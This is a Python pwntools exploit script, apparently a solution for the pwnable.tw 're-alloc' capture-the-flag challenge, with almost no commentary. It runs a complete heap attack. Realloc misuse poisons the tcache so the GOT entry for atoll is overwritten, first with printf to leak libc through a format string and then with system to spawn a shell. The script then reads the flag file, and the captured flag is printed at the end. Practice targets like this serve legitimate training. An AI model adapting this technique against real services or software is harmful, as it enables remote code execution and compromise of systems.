#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(s)
def _sndl(s):
  io.sendline(s)
def _snda(a,s):
  io.sendafter(a,s)
def _sndla(a,s):
  io.sendlineafter(a,s)
def _rcvu(s):
  return io.recvuntil(s)
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
def _rcvl():
    return io.recvline()


exe = context.binary = ELF('re-alloc')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10106)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript, *a, **kw)
    return p 

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

prompt = 'Your choice:'
def allocator(option, index, size, string = ''):
    _rcvu(prompt)
    _sndl(str(option))
    _rcvu(':')
    _sndl(str(index))
    _rcvu(':')
    _sndl(str(size))
    if size != 0:
        _rcvu(':')
        _snd(string)

def alloc(index, size, string = ''):
    allocator(1, index, size, string)

def realloc(index, size, string = ''):
    allocator(2, index, size, string)

def free(index):
    _rcvu(prompt)
    _sndl('3')
    _rcvu(':')
    _sndl(str(index))

context.terminal = ['gnome-terminal', '-e']

io = start()
def add_fake_to_tcache(bin_size, addr):
    log.info('Creating fake chunk at {} of size {}...'.format(hex(addr), hex(bin_size)))
    alloc(0, bin_size, 'A'*16)
    realloc(0, 0)
    realloc(0, bin_size, p64(addr))
    alloc(1, bin_size, 'B'*16)
    log.success('{} is in the bin'.format(hex(addr)))

    realloc(0, bin_size + 0x10, 'C'*16)
    free(0)
    realloc(1, bin_size + 0x10, 'D'*16)
    free(1)
    log.info('Cleaned up')

add_fake_to_tcache(0x18, exe.got['atoll'])
add_fake_to_tcache(0x48, exe.got['atoll'])

alloc(0, 0x48, p64(exe.symbols['printf']))
log.info('Overwrite atoll@got with printf@plt')

_rcvu(prompt)
_sndl('1')
_rcvu(':')
_sndl('%23$p')

leak = _rcvl().strip()
libc_start_main_ret = int(leak, 16)
libc_base = libc_start_main_ret - 0x26b6b

log.success('libc at {}'.format(hex(libc_base)))
libc = ELF('./libc_realloc.so')
libc.address = libc_base

log.success('system at {}'.format(hex(libc.symbols['system'])))

_rcvu(prompt)
_sndl('1')
_rcvu(':')
_sndl('') # 1 char => index 1
_rcvu(':')
_snd('A'*0x10) # 0x10 chars ~ 0x18 chunk
_rcvu(':')
_sndl(p64(libc.symbols['system']))
log.info('Overwrite atoll@got with system@libc')

_rcvu(prompt)
_sndl('1')
_rcvu(':')
_sndl('/bin/sh\x00')
_sndl('cat /home/re-alloc/flag')
log.success('Pwned')

io.interactive()

# FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}

